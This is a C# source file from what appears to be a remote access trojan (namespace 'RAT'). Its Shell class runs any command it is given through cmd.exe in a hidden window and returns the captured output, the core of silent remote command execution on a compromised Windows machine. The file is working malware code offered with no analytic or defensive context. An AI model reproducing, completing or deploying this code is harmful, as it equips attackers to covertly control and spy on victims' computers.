using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT
{
    class Shell
    {
        public static String Exec(String command)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                psi.FileName = "cmd.exe";
                psi.Arguments = @"/c " + command;
                psi.RedirectStandardOutput = true;
                psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                psi.UseShellExecute = false;
                System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ;
                System.IO.StreamReader myOutput = proc.StandardOutput;
                proc.WaitForExit(2000);
                if (proc.HasExited)
                {
                    string output = myOutput.ReadToEnd();
                    return output;
                }
                else
                {
                    string output = myOutput.ReadToEnd();
                    return output;
                }
            }
            catch(Exception e)
            {
                return e.ToString(); 
            }
        }
    }
}
